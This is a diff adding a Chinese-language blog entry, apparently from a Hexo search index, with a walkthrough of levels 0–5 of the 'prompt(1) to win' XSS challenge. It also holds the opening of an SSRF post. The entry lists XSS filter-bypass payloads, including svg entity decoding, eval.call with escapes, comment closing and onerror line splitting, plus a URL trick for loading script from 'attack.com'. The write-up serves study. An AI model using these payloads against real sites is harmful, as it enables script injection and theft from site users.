@@ -3,6 +3,60 @@
   
     
     <entry>
+      <title><![CDATA[XSS学习(未完..)]]></title>
+      <url>/2018/03/16/learn_xss.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>XSS</code> 漏洞原理非常简单，实际应用中非常灵活，于是通过 <a href="http://prompt.ml/" target="_blank" rel="external">prompt(1) to win</a> 来学习学习</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">分析正则表达式</div><div class="line">https://regex101.com/</div><div class="line">http://xssor.io/</div></pre></td></tr></table></figure>
+<p><strong>第0关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521200686201a6luin27.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;\\</div></pre></td></tr></table></figure>
+<p><strong>第1关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521200730755wi01h7ty.png?imageslim" alt="paste image"><br>正则过滤 <code>&lt;</code> 由 <code>&gt;</code> 包含的字符,所以需要不使用 <code>&gt;</code> 的 <code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;style/onload=&quot;prompt(1)&quot;;//</div><div class="line">&lt;img/src=% onerror=prompt(1)//</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521204626918j4xenqu4.png?imageslim" alt="paste image"></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15212033833744ewye026.png?imageslim" alt="paste image"></p>
+<p>过滤了<code>=</code> 和 <code>(</code> , 而我们执行 <code>prompt(1)</code> 是需要  <code>(</code> ，这里有一个知识点，浏览器会 <code>&lt;svg&gt;</code> 标签的中的元素认为是 <code>xml</code> 元素，会对其中的内容进行 <code>html</code> 实体解码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>或者使用 <code>eval.call</code> 执行 <code>js</code> 代码，函数参数为 <code>js</code> 字符串，所以可以使用 16进制编码。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521204061258m4y5w8of.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;eval.call`$&#123;&apos;prompt\u00281)&apos;&#125;`&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p><strong>第3关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521204646852qmiejms5.png?imageslim" alt="paste image"></p>
+<p>我们的输入被放置在注释里面，于是想办法闭合注释，不过 <code>-&gt;</code> 被过滤，有一个知识点，<code>--!&gt;</code> 也可以闭合注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--!&gt;&lt;svg/onload=prompt(1)</div></pre></td></tr></table></figure>
+<p><strong>第4关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521205823314rfel0g9s.png?imageslim" alt="paste image"></p>
+<p>输入被做为 加载 <code>js</code> 资源的 <code>url</code>, 同时要以 <code>http://prompt.ml/</code> 开头，于是可以使用 <code>http://prompt.ml%2f@attack.com</code> 加载远程攻击者的 <code>js</code>.( 先url解码才匹配，所以 <code>/</code> —&gt; <code>%2f</code> ）</p>
+<p><strong>第5关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/152120660937655oq71el.png?imageslim" alt="paste image"></p>
+<p>把 <code>&gt;</code> , <code>on***=</code>, <code>focus</code> 过滤掉了, 我们的能力就是可以修改 <code>input</code> 标签的属性值，由于 <code>focus</code> 被过滤，利用 <code>onfocus</code> 和 <code>autofocus</code> 组合的方式也不能利用了。</p>
+<p>知识点介绍</p>
+<ul>
+<li>如果出现两个相同的属性值，后面的属性值被忽略。</li>
+<li><code>.+?</code> 正则不会<strong>跨行匹配</strong>，但是 浏览器 可以 <strong>跨行匹配</strong>，比如 <code>onerror\n=</code> 正则匹配不上，但是 浏览器 可以正常处理</li>
+</ul>
+<p>于是 <code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&quot; type=&quot;image&quot; src=# onerror</div><div class="line">=&quot;prompt(1)</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521207768889e6tf8kh9.png?imageslim" alt="paste image"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[SSRF学习]]></title>
       <url>/2018/03/16/learn_ssrf.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>SSRF(Server-Side Request Forgery ，服务器端请求伪造)</code> 是一种由攻击者构造形成由服务器发起请求的一个安全漏洞</p>
